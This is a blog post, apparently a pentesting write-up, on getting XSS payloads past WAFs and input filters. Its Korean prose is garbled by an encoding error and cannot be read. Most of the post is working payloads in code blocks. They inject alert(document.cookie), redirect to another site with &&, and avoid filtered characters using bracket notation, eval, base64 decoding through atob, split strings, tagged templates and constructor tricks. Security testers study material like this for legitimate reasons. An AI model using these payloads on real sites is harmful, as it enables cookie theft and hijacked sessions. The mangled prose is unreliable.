---
title: "XSS Bypass WAF & Filtering ê¸°ë²•"
description: "ëª¨ì˜í•´í‚¹ ë° ë²„ê·¸ë°”ìš´í‹° ì‹œ XSS ì·¨ì•½ì  ë¶„ì„ì—ì„œ ì–»ì€ WAF ìš°íšŒ ë° í•„í„°ë§ ìš°íšŒ ê¸°ë²•"
date: 2019-10-15
tags: ["web-security", "xss", "bypass", "waf"]
category: "Security Research"
published: true
---

# Web Hacking XSS Bypass WAF & Bypass Filtering


## ğŸ“¸ ì›ë³¸ ì´ë¯¸ì§€

![Image 1](/images/posts/xss-bypass-waf-filtering_15359c2b.png)


## Summary

ë³¸ ê¸€ì€ ê°ì¢… ëª¨ì˜í•´í‚¹ ë° ë²„ê·¸ë°”ìš´í‹° ì‹œ XSS ì·¨ì•½ì ì„ ë¶„ì„í•˜ë©° ì–»ì€ ê²½í—˜ì„ í† ëŒ€ë¡œ ì‘ì„±í•œ ê¸€ì…ë‹ˆë‹¤.

ì„œë²„ ì†ŒìŠ¤ì½”ë“œë‹¨ì˜ í•„í„°ë§ ë° ë„¤íŠ¸ì›Œí¬ë‹¨ì˜ WAF í•„í„°ë§ ë“±ì„ ìš°íšŒí•˜ì—¬ XSS Exploitì„ ì„±ê³µì‹œí‚¤ê¸° ìœ„í•œ ê¸°ë²•ë“¤ì„ ì¼ë¶€ ì •ë¦¬í•˜ì˜€ìŠµë‹ˆë‹¤.

---

## Example 1

### ì¡°ê±´ 1
`https://ar9ang3.com/?param1=abc`ë¡œ ìš”ì²­í–ˆì„ ì‹œ (GET/POST)

### ì¡°ê±´ 2
ì„œë²„ë‹¨ì— ìš”ì²­í•œ URIê°€ ì§ì ‘ javascriptë‹¨ìœ¼ë¡œ ì‚½ì…ë  ê²½ìš°

```html
<script>
document.location.href = 'https://ar9ang3.tistory.com/?param1=abc';
</script>
```

### ì œì•½ì¡°ê±´ 3
`%3b`(;), `%2b`(+)ê°€ WAFë‹¨ì—ì„œ í•„í„°ë§ë˜ì–´ `document.location.href=`ë¥¼ ë²—ì–´ë‚˜ì§€ ëª»í•  ê²½ìš°

---

## ìš°íšŒ ë° XSS íŠ¸ë¦¬ê±° ì½”ë“œ 1 (Reflected XSS)

ë¬¸ìì—´ - Native Function - ë¬¸ìì—´ ì„ ìˆ˜í–‰í•  ì‹œ ë¬¸ìì—´ì˜ ê²°ê³¼ë¥¼ ì—°ì‚°í•˜ëŠ” ê³¼ì •ì—ì„œ Native Functionì´ ì‹¤í–‰ë˜ê²Œ ë©ë‹ˆë‹¤.

```
?param1=abc'-alert(document.cookie)-'def
```

ê²°ê³¼:
```html
<script>
document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'-alert(document.cookie)-'def';
</script>
```

## ìš°íšŒ ë° XSS íŠ¸ë¦¬ê±° ì½”ë“œ 2 (Redirect to other Site)

`&&` ì—°ì‚°ìë¥¼ ì´ìš©:

```
?param1=abc'&&'https://ar9ang3.com/
```

ê²°ê³¼:
```html
<script>
document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'&&'https://ar9ang3.com/';
</script>
```

ë¬¸ìì—´ && ë¬¸ìì—´ ì„ í•  ì‹œ ë’¤ì˜ ë¬¸ìì—´ì´ ìµœì¢…ì ìœ¼ë¡œ ì ìš©ë˜ê¸° ë•Œë¬¸ì— ì›í•˜ëŠ” í˜ì´ì§€ë¡œ redirect ê°€ëŠ¥

---

## WAF Bypass Tips

### `.` í•„í„°ë§ ì‹œ
```javascript
document.cookie => document['cookie']
```

### `"` í•„í„°ë§ ì‹œ
```javascript
eval("alert(1)") => eval[alert(1)]
```

### `;`ë‚˜ `+` í•„í„°ë§ ì‹œ
```javascript
'abc'-alert(1)-'def' => 'abc'-alert(1)^1&&'normal_string_here'
```

### ì¢…í•© ì˜ˆì‹œ
```javascript
'abc'-eval[alert(document['cookie'])]^1&&'normal_string_here'
```

---

## More Filtering Bypass Tips

ì„ì˜ì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ì„ ì‚½ì…í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì • ì‹œ ë‘ ê°€ì§€ë¥¼ ê³ ë ¤:

1. ì‚½ì…ëœ ìë°”ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ìœ¼ë¡œ ì¸í•˜ì—¬ **ë¬¸ë²• ì—ëŸ¬**ê°€ ìœ ë°œë˜ì§€ ì•ŠëŠ”ì§€
2. ì‚½ì…í•˜ëŠ” ìë°”ìŠ¤í¬ë¦½íŠ¸ êµ¬ë¬¸ì´ **í•„í„°ë§**ë˜ì§€ ì•ŠëŠ”ì§€

### Method: `</script>`ì™€ `<noscript>`ë¥¼ ì´ìš©

```html
<script>
try {
if ('injection'==<%=request.getParameter("param")%>) {
var a = "blahblah";
}
} catch(e) { }
alert(document.cookie);
</script>
<noscript>";
}
...
```

ë‘ ì‚½ì…ì§€ì  ì‚¬ì´ì˜ ì½”ë“œë¥¼ ë¬¸ìì—´í™”í•˜ë ¤ë©´ `` ` ``(Back Quote)ë¥¼ ì‚¬ìš©í•˜ê±°ë‚˜ `/* */` ì£¼ì„ì„ ì´ìš©

---

## í•„í„°ë§ ë¬¸ìë³„ ìš°íšŒ ë°©ë²•

í•„í„°ë§ë˜ëŠ” ë¬¸ì: `<`, `>`, `'`, `"`, `(`, `)`, `` ` ``, `;`, `%`, `&`, `+`

### Native function ìì²´ í•„í„°ë§ ì‹œ
```javascript
var a=alert; a(document.cookie);
```

### `document.cookie` ë“± í•„í„°ë§ ì‹œ
```javascript
var a='alert'; var b='(documen'; var c='t.cooki'; var d='e)'; var e=eval; e(a+b+c+d);
```

### ë¬¸ìì—´ í•„í„°ë§ ì‹œ (Base64 ì¸ì½”ë”©)
```javascript
var a=eval; a(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="));
```

### `'` / `"` í•„í„°ë§ ì‹œ
```
?param_a=\&param_b=;alert(document.cookie);var%20z='
```

ê²°ê³¼:
```javascript
var a='\'; var b=';alert(document.cookie);var z='';
```

### ê´„í˜¸ `( )` í•„í„°ë§ ì‹œ
```javascript
alert`123`;
btoa.constructor`alert\x28document.cookie\x29```
```

---

## ë§ˆì¹˜ë©°

XSSì˜ ê²½ìš° Mitigation êµ¬í˜„ë„ ë‹¤ì–‘í•˜ê³  ì‚½ì…ë˜ëŠ” ìœ„ì¹˜ì™€ ìƒí™©ë„ ëª¨ë‘ ë‹¤ ë‹¤ì–‘í•©ë‹ˆë‹¤.

ì²œí¸ì¼ë¥ ì ì¸ ìš°íšŒ ê¸°ë²•ì´ ì•„ë‹ˆë¼ **ê·¸ë•Œê·¸ë•Œ ìƒí™©ì— ë§ì¶”ì–´ ìš°íšŒí•˜ëŠ”ê²ƒì´ ì¤‘ìš”**í•©ë‹ˆë‹¤.

ìµœê·¼ í•œê¸€ XSS, ê°€íƒ€ì¹´ë‚˜ XSS ë“± ìƒˆë¡œìš´ ë°©ë²•ë“¤ì´ ê³„ì† ë‚˜ì˜¤ê³  ìˆìŠµë‹ˆë‹¤.
